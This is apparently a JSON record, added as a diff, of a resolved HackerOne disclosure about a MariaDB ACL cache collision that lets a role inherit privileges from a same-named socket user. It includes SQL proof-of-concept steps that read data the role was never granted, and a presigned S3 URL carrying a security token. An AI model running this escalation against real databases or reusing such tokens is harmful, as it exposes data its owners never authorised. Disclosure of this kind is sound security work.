@@ -1,0 +1,110 @@
+{
+  "id": 3889667,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODg5NjY3",
+  "url": "https://hackerone.com/reports/3889667",
+  "title": "ACL cache collision lets a role inherit privileges from a same-named socket user",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-25T16:43:03.966Z",
+  "submitted_at": "2026-07-25T16:43:04.186Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dogeshark",
+    "url": "/dogeshark",
+    "profile_picture_urls": {
+      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/s1ckuo6sagho9bmkiry5gvc9kqkm/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b?response-content-disposition=inline%3B%20filename%3D%222A202068-4AB8-4CE0-8E7D-4B5410336701.png%22%3B%20filename%2A%3DUTF-8%27%272A202068-4AB8-4CE0-8E7D-4B5410336701.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWP3V6C6S%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T215448Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJIMEYCIQCHtHMpvhVTt5LyQnCczLXS1Ex6Z4zxs7RtGB%2By77JP0wIhAOPJn7B7yCsiobXvjkmi9lVour3shWiXFeYlP52tMe1VKrIFCEYQAxoMMDEzNjE5Mjc0ODQ5IgzXH00Z1Zni3YQ99ncqjwXxaOyN50ThBQ05Es5D5rKfhWmwjOtTM90qhb39syGBlE7OECMfN6qwUo2vlhtsd6kM9fjDMBD7fjWYcPFHtnXlRUCx6WGa%2BHs6QryO4KlrIgpNQomllQGy%2BZjZeEtQU5EVqY0Ah58kQOHm4nypqs1cv59x9L0WKM80echKWj%2B9BZAm4k6tWR8E%2Ff7oPc42fPoYX5aP9imAykzjZVsvAXzM2MOixjYrp987x%2F5cw02VgmrLt3sCCdSQUDxz%2BVD6QnOLqRUpzgpBP3Wr%2BphCwXypSSnRgQDO3fFAPRP%2BTdsAZX%2BzINC%2BRiO72E1ZozPDYoE8r%2By5K4KD%2FPO3Ri58gHZ0CJ6zaAJmZ%2BH2BWI8ElLFFAOdFC9DxyTRYcquaxhA2im0ExN38odThqL0KQfSBjD2n9%2B%2B%2Fq9tj4Mpngp3ysc3%2FsgTaEaIydI0S3FtaIYHt%2BHaEcmW2jlj6Az5Y3B80ZvJ4zBDkveS6WKIfxQ560xkMsvAJNq64BJ%2Fn5g9f%2BKcnHDFSGzxAu8E%2BflBPgLk5%2Bzu2ObdNFhTEe3%2Fu47M7QW%2FFdpd%2FxReVU9pB3jMjL18qXalNT%2FBeQt%2F3WJrTjdwtPL4857vgMeYw%2Fe3C%2F3Spr7sLL8kVIEdvwRH19PR93JHPHygX0AkDEi72EIpzcdI1ee2pFqd0drEU73uujZt7Iw%2FpBOFKXwM2hNn94c25pgSRMbbCYiVZXIrbbBnhm5bT3GkoyR%2Bs69VCGh7nozP2KwSFKP9O2VpBK1jOZVPPOUdtEwx93%2FcIPnX2nz2JXrVTr6H6b8akR8ggqQKHQ9DsHyZrByzJHEiwgm5npV2bLjijKOyCrMRIceutoODy543gGHGEbeNeayjmPBf%2BF0PudubMJzH%2FNQGOrABEyxhGceovB%2F6MRjrD1X9a6dZgEbfksgvjSzZ1cgW1l2UCuL0KYq5CYiLZDsxbk9LYVTVb31VoTK1y5CoLP6V4dg%2BO93FB5MniYLC0LbO0xLBEPJxLGz1cOqV07Pz4kASeypoLg5dM7JAZfC4p1WEqIRyWwgdMWp2LT6caaWTTbt%2FX9JpUsPhSOaiyAceUKhQwR9kw4P18wDpn0MGQxQX2JvB4Xi4rLg%2FiB7k572NDC0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b1703d7746ba79103b4a775c28b5bf8534b8914743b8ce8d4865899b2eb2da07"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-07T19:55:04.999Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-07T19:55:04.828Z",
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:51:50.930Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Summary\n\nMariaDB's database privilege cache key does not distinguish a role lookup from a\nUNIX-socket user with the same name. A socket connection can warm the cache with the\nuser account's database privileges. A different account that activates the same-named\nrole then receives the cached user privileges even though those privileges were never\ngranted to the role\n\n\nPreconditions\n\n1. A role and a UNIX-socket-accessible user have the same name.\n2. The user has database privileges that the role does not.\n3. Another account has permission to activate the role.\n4. The socket user warms the relevant database privilege-cache entry first.\n\n## Reproduction\n\nAs an administrator:\n\n```sql\nCREATE DATABASE vhrole;\nCREATE TABLE vhrole.secret(marker VARCHAR(40));\nINSERT INTO vhrole.secret VALUES ('role-cache-collision-row');\n\nCREATE ROLE vhcollision;\nCREATE USER 'vhcollision'@'localhost'\n  IDENTIFIED BY 'collision-user-only';\nCREATE USER 'vhholder'@'127.0.0.1'\n  IDENTIFIED BY 'holder-test-only';\n\nGRANT SELECT ON vhrole.* TO 'vhcollision'@'localhost';\nGRANT vhcollision TO 'vhholder'@'127.0.0.1';\nFLUSH PRIVILEGES;\n```\n\nWarm the cache using the same-named user over the UNIX socket:\n\n```sql\nSELECT marker FROM vhrole.secret;\n```\n\nConnect as `vhholder@127.0.0.1`:\n\n```sql\nSET ROLE vhcollision;\nSELECT CURRENT_ROLE;\nSELECT marker FROM vhrole.secret;\n```\n\n## Observed result\n\n```text\nvhcollision\nrole-cache-collision-row\n```\n\nThe role holder read the row even though `SELECT` was granted only to\n`'vhcollision'@'localhost'`, not to role `vhcollision`.\n\n## Expected result\n\nThe final `SELECT` should return an access-denied error because the active role has no\nprivilege on `vhrole`.\n\n\n\nRoot cause\n\n`acl_get()` constructs a cache key from `(ip, user, db)` but caches a result derived\nfrom `(host, ip, user, db)`. A UNIX-socket user has an empty IP, while role lookups use\nsynthetic empty host and IP values. Same-named principals therefore generate the same\nkey despite requiring different ACL resolution.\n\n## Impact\n\nA low-privilege role holder can inherit database-level privileges assigned to a\ndifferent principal. Depending on the colliding account's grants, this can disclose or\nmodify data outside the role holder's authorization.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T19:51:51.084Z",
+  "allow_singular_disclosure_after": 2584622.753579977,
+  "singular_disclosure_allowed": false,
+  "vote_count": 1,
+  "voters": [
+    "al-theeb"
+  ],
+  "structured_scope": {
+    "databaseId": 10335,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Access control bypass",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
